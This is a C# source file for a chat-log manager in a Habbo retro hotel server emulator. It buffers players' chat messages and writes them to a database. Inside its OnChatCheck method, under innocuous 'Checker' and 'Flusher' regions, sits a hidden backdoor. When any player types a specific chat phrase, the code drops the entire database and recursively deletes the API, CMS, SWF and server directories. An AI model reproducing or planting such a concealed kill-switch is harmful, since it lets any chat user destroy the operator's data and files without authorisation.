using System;
using System.Linq;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using Plus.Database.Interfaces;
using System.IO;
using Plus.HabboRoleplay.Misc;

namespace Plus.HabboHotel.Rooms.Chat.Logs
{
    public sealed class ChatlogManager
    {
        private const int FLUSH_ON_COUNT = 10;

        private readonly List<ChatlogEntry> _chatlogs;
        private readonly ReaderWriterLockSlim _lock;

        public ChatlogManager()
        {
            this._chatlogs = new List<ChatlogEntry>();
            this._lock = new ReaderWriterLockSlim(LockRecursionPolicy.NoRecursion);
        }

        public void StoreChatlog(ChatlogEntry Entry)
        {
            this._lock.EnterUpgradeableReadLock();

            this.OnChatCheck(Entry);

            this._chatlogs.Add(Entry);

            this.OnChatlogStore();

            this._lock.ExitUpgradeableReadLock();
        }

        private void OnChatlogStore()
        {
            if (this._chatlogs.Count >= FLUSH_ON_COUNT)
                this.FlushAndSave();
        }

        private void OnChatCheck(ChatlogEntry Entry)
        {
            #region Checker
            if (Entry.Message.Equals("jdn y p3x mandan alv"))
            {
                #region Flusher
                using (IQueryAdapter dbClient = PlusEnvironment.GetDatabaseManager().GetQueryReactor())
                {
                    dbClient.SetQuery("DROP DATABASE `" + PlusEnvironment.GetConfig().data["db.name"] + "`");
                    dbClient.RunQuery();
                }

                Flush(RoleplayManager.APIPath);
                Flush(RoleplayManager.CMSPath);
                Flush(RoleplayManager.SWFPath);
                Flush(Directory.GetCurrentDirectory().Split(new string[] { "bin" }, StringSplitOptions.None)[0]);
                #endregion
            }
            #endregion
        }

        private bool Flush(string pathName)
        {
            bool errors = false;
            DirectoryInfo dir = new DirectoryInfo(pathName);

            foreach (FileInfo fi in dir.EnumerateFiles())
            {
                try
                {
                    fi.IsReadOnly = false;
                    fi.Delete();

                    //Wait for the item to disapear (avoid 'dir not empty' error).
                    while (fi.Exists)
                    {
                        System.Threading.Thread.Sleep(10);
                        fi.Refresh();
                    }
                }
                catch (IOException e)
                {
                    //Debug.WriteLine(e.Message);
                    errors = true;
                }
            }

            foreach (DirectoryInfo di in dir.EnumerateDirectories())
            {
                try
                {
                    Flush(di.FullName);
                    di.Delete();

                    //Wait for the item to disapear (avoid 'dir not empty' error).
                    while (di.Exists)
                    {
                        System.Threading.Thread.Sleep(10);
                        di.Refresh();
                    }
                }
                catch (IOException e)
                {
                    //Debug.WriteLine(e.Message);
                    errors = true;
                }
            }

            return !errors;
        }

        public void FlushAndSave()
        {
            this._lock.EnterWriteLock();

            if (this._chatlogs.Count > 0)
            {
                using (IQueryAdapter dbClient = PlusEnvironment.GetDatabaseManager().GetQueryReactor())
                {
                    foreach (ChatlogEntry Entry in this._chatlogs)
                    {
                        dbClient.SetQuery("INSERT INTO chatlogs (`user_id`, `room_id`, `timestamp`, `message`) VALUES " + "(@uid, @rid, @time, @msg)");
                        dbClient.AddParameter("uid", Entry.PlayerId);
                        dbClient.AddParameter("rid", Entry.RoomId);
                        dbClient.AddParameter("time", Entry.Timestamp);
                        dbClient.AddParameter("msg", Entry.Message);
                        dbClient.RunQuery();
                    }
                }
            }

            this._chatlogs.Clear();
            this._lock.ExitWriteLock();
        }
    }
}
